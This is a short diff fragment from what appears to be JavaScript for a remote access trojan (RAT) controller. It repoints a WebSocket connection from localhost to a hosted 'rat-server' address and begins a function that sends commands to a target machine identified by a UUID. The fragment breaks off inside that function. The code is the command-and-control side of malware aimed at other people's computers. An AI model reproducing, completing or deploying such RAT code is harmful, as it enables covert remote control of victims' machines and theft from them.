@@ -1,5 +1,5 @@
 const WebSocket = require("ws")
-const ws = new WebSocket("ws://localhost:2000")
+const ws = new WebSocket("ws://rat-server-n24e.onrender.com")
 
 async function sendCmd2(cmd,target,uuid,w, data,role){
     w.send(JSON.stringify({
